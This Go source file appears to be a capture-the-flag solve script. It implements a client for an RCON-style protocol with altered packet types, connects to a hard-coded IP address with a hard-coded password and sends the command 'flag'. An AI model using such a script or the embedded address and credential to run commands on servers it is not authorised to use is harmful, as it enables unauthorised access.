package main

import (
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"time"
)

func main() {
	conn, err := Dial("147.45.254.202:7125", "thisisrealpasswordyoucanuseitforyourexploit")
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	response, err := conn.Execute("flag")
	if err != nil {
		log.Fatal(err)
	}

	fmt.Println(response)
}

const (
	SERVERDATA_AUTH int32 = 0x5
	SERVERDATA_AUTH_ID int32 = 0x5
	SERVERDATA_AUTH_RESPONSE int32 = 0x6
	SERVERDATA_RESPONSE_VALUE int32 = 0x7
	SERVERDATA_EXECCOMMAND int32 = 0x6
	SERVERDATA_EXECCOMMAND_ID int32 = 0x7
)

type Conn struct {
	conn net.Conn
}

// Dial creates a new authorized Conn tcp dialer connection.
func Dial(address string, password string) (*Conn, error) {
	conn, err := net.DialTimeout("tcp", address, time.Second)
	if err != nil {
		return nil, err
	}

	client := Conn{conn: conn}

	if err := client.auth(password); err != nil {
		if err2 := client.Close(); err2 != nil {
			return &client, err2
		}

		return &client, err
	}

	return &client, nil
}

func (c *Conn) Execute(command string) (string, error) {
	if command == "" {
		return "", errors.New("command is empty")
	}

	if len(command) > 0x40 {
		return "", errors.New("too long cmd")
	}

	if err := c.write(SERVERDATA_EXECCOMMAND, SERVERDATA_EXECCOMMAND_ID, command); err != nil {
		return "", err
	}

	response, err := c.read()
	if err != nil {
		return response.Body(), err
	}

	if response.ID != SERVERDATA_EXECCOMMAND_ID {
		return response.Body(), errors.New("invalid packet id")
	}

	return response.Body(), nil
}

func (c *Conn) LocalAddr() net.Addr {
	return c.conn.LocalAddr()
}

func (c *Conn) RemoteAddr() net.Addr {
	return c.conn.RemoteAddr()
}

func (c *Conn) Close() error {
	return c.conn.Close()
}

func (c *Conn) auth(password string) error {
	if err := c.write(SERVERDATA_AUTH, SERVERDATA_AUTH_ID, password); err != nil {
		return err
	}

	response, err := c.readHeader()
	if err != nil {
		return err
	}

	size := response.Size - PacketHeaderSize
	if size < 0 {
		return errors.New("invalid size")
	}

	if response.Type == SERVERDATA_RESPONSE_VALUE {
		_, _ = c.conn.Read(make([]byte, size))
		if response, err = c.readHeader(); err != nil {
			return err
		}
	}

	buffer := make([]byte, size)
	if _, err := c.conn.Read(buffer); err != nil {
		return err
	}

	if response.Type != SERVERDATA_AUTH_RESPONSE {
		return errors.New("invalid packet id")
	}

	if response.ID == -1 {
		return errors.New("auth failed")
	}

	if response.ID != SERVERDATA_AUTH_ID {
		return errors.New("invalid packet id")
	}

	return nil
}

func (c *Conn) write(packetType int32, packetID int32, command string) error {
	packet := NewPacket(packetType, packetID, command)
	_, err := packet.WriteTo(c.conn)

	return err
}

func (c *Conn) read() (*Packet, error) {
	packet := &Packet{}
	if _, err := packet.ReadFrom(c.conn); err != nil {
		return packet, err
	}

	if packet.Type == 4 {
		if _, err := packet.ReadFrom(c.conn); err != nil {
			return packet, err
		}

		if packet.ID == -1 {
			packet.ID = SERVERDATA_EXECCOMMAND_ID
		}
	}

	return packet, nil
}

func (c *Conn) readHeader() (Packet, error) {
	var packet Packet
	if err := binary.Read(c.conn, binary.LittleEndian, &packet.Size); err != nil {
		return packet, err
	}

	if err := binary.Read(c.conn, binary.LittleEndian, &packet.ID); err != nil {
		return packet, err
	}

	if err := binary.Read(c.conn, binary.LittleEndian, &packet.Type); err != nil {
		return packet, err
	}

	return packet, nil
}

const (
	PacketPaddingSize int32 = 2
	PacketHeaderSize  int32 = 8

	MinPacketSize = PacketPaddingSize + PacketHeaderSize
)

type Packet struct {
	Size int32
	ID int32
	Type int32
	body []byte
}

func NewPacket(packetType int32, packetID int32, body string) *Packet {
	size := len([]byte(body)) + int(PacketHeaderSize+PacketPaddingSize)

	return &Packet{
		Size: int32(size),
		Type: packetType,
		ID:   packetID,
		body: []byte(body),
	}
}

func (packet *Packet) Body() string {
	return string(packet.body)
}

func (packet *Packet) WriteTo(w io.Writer) (int64, error) {
	buffer := bytes.NewBuffer(make([]byte, 0, packet.Size+4))

	_ = binary.Write(buffer, binary.LittleEndian, packet.Size)
	_ = binary.Write(buffer, binary.LittleEndian, packet.ID)
	_ = binary.Write(buffer, binary.LittleEndian, packet.Type)

	buffer.Write(append(packet.body, 0x00, 0x00))

	return buffer.WriteTo(w)
}

func (packet *Packet) ReadFrom(r io.Reader) (int64, error) {
	var n int64

	if err := binary.Read(r, binary.LittleEndian, &packet.Size); err != nil {
		return n, err
	}

	n += 4

	if packet.Size < MinPacketSize {
		return n, errors.New("too small")
	}

	if err := binary.Read(r, binary.LittleEndian, &packet.ID); err != nil {
		return n, err
	}

	n += 4

	if err := binary.Read(r, binary.LittleEndian, &packet.Type); err != nil {
		return n, err
	}

	n += 4

	packet.body = make([]byte, packet.Size-PacketHeaderSize)

	var i int32
	for i < packet.Size-PacketHeaderSize {
		var m int
		var err error

		if m, err = r.Read(packet.body[i:]); err != nil {
			return n + int64(m) + int64(i), err
		}

		i += int32(m)
	}

	n += int64(i)

	if !bytes.Equal(packet.body[len(packet.body)-int(PacketPaddingSize):], []byte{0x00, 0x00}) {
		return n, errors.New("invalid packet padding")
	}

	packet.body = packet.body[0 : len(packet.body)-int(PacketPaddingSize)]

	return n, nil
}